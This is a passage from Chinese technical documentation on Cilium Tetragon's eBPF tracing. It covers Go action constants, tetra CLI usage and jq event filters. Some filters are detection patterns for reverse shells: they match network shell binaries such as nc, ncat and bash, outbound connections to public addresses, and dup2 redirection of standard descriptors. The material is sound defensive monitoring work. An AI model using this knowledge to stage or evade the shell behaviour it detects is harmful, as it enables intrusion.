    ArgSig    int    `json:"argSig"`      // NotifyEnforcer/Signal 的信号
}
```

#### 3.2.3 Go 侧 Action 常量

**源码位置**: `pkg/selectors/kernel.go:33-48`

```go
const (
    ActionTypePost                        = 0
    ActionTypeFollowFd                    = 1
    ActionTypeSigKill                     = 2
    ActionTypeUnfollowFd                  = 3
    ActionTypeOverride                    = 4
    ActionTypeCopyFd                      = 5
    ActionTypeGetUrl                      = 6
    ActionTypeDnsLookup                   = 7
    ActionTypeNoPost                      = 8
    ActionTypeSignal                      = 9
    ActionTypeTrackSock                   = 10
    ActionTypeUntrackSock                 = 11
    ActionTypeNotifyEnforcer              = 12
    ActionTypeCleanupEnforcerNotification = 13
    ActionTypeSet                         = 14
)
```

---

## 附录：tetra CLI 和 jq 过滤命令参考

### A.1 tetra 基本用法

```bash
# 启动 Tetragon 并观察事件
sudo tetragon --bpf-lib /var/lib/tetragon/ --tracing-policy policy.yaml

# 使用 tetra CLI 获取事件流
tetra getevents -o json

# 过滤特定事件类型
tetra getevents -o json --event-types PROCESS_KPROBE
```

### A.2 常用 jq 过滤命令

```bash
# 过滤 kprobe 事件并提取关键字段
tetra getevents -o json | jq 'select(.process_kprobe != null)'

# 按函数名过滤
tetra getevents -o json | jq '
  select(.process_kprobe.function_name == "tcp_connect")'

# 提取网络连接五元组
tetra getevents -o json | jq '
  select(.process_kprobe.function_name == "tcp_connect")
  | .process_kprobe
  | {
      process: .process.binary,
      pid: .process.pid.value,
      daddr: .args[0].sock_arg.daddr,
      dport: .args[0].sock_arg.dport,
      protocol: .args[0].sock_arg.protocol
    }'

# 过滤外连非私有地址
tetra getevents -o json | jq '
  select(.process_kprobe.function_name == "tcp_connect")
  | select(.process_kprobe.args[0].sock_arg.daddr
    | test("^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)") | not)'

# 过滤 Sigkill 动作
tetra getevents -o json | jq '
  select(.process_kprobe.action == "KPROBE_ACTION_SIGKILL")'

# 按进程名过滤
tetra getevents -o json | jq '
  select(.process_kprobe.process.binary
    | test("bash|nc|ncat|python|perl|php"))'

# 检测 FD 重定向（dup2 到 stdin/stdout/stderr）
tetra getevents -o json | jq '
  select(.process_kprobe.function_name | test("dup[23]?$"))
  | select(.process_kprobe.args[]
    | select(.int_arg != null and .int_arg.value <= 2))'
```

### A.3 TracingPolicy 应用

```bash
# Kubernetes 环境
kubectl apply -f policy.yaml

# 独立模式
sudo tetragon --bpf-lib /var/lib/tetragon/ \
  --tracing-policy policy.yaml

# 多策略同时加载
sudo tetragon --bpf-lib /var/lib/tetragon/ \
  --tracing-policy process-detect.yaml \
  --tracing-policy network-detect.yaml \
  --tracing-policy fd-detect.yaml
```

### A.4 核心源文件索引

| 文件路径 | 内容 | 相关文档 |
|---------|------|---------|
| `bpf/process/bpf_generic_kprobe.c` | Kprobe 入口 + Tail Call 定义 | Doc 0 |
| `bpf/process/generic_calls.h` | Tail Call 管道完整实现 | Doc 0 |
| `bpf/process/generic_maps.h` | BPF Map 定义 | Doc 0 |
| `bpf/process/types/basic.h` | 类型ID、Action枚举、过滤函数 | Doc 0,1,2,3,4 |
| `bpf/process/types/operations.h` | 操作符枚举 | Doc 0,2 |
| `bpf/process/types/sock.h` | sk_type, set_event_from_sock() | Doc 2 |
| `bpf/process/types/tuple.h` | tuple_type 五元组 | Doc 2 |
| `bpf/process/types/sockaddr.h` | sockaddr_in_type | Doc 2 |
| `bpf/process/types/socket.h` | set_event_from_socket() | Doc 2 |
| `bpf/process/addr_lpm_maps.h` | LPM Trie CIDR 匹配 Map | Doc 2 |
| `bpf/process/string_maps.h` | 字符串匹配 Map 族 | Doc 1,4 |
| `bpf/process/pfilter.h` | 进程过滤 + matchBinaries | Doc 1 |
| `bpf/process/bpf_enforcer.c` | Enforcer BPF 程序 | Doc 3 |
| `bpf/process/bpf_enforcer.h` | Enforcer 数据结构 | Doc 3 |
| `bpf/process/bpf_execve_event.c` | Execve 事件 | Doc 1 |
| `bpf/process/bpf_execve_bprm_commit_creds.c` | Fileless/setuid 检测 | Doc 1 |
| `pkg/selectors/kernel.go` | 选择器编译 | Doc 0,1,2,3,4 |
| `pkg/sensors/tracing/generickprobe.go` | Kprobe 事件处理 | Doc 0,1,2,3,4 |
| `pkg/sensors/tracing/args_linux.go` | 参数解析 | Doc 1,2,3,4 |
| `pkg/grpc/tracing/tracing.go` | Protobuf 转换 | Doc 0 |
| `pkg/observer/observer_linux.go` | Ring Buffer 读取 | Doc 0 |
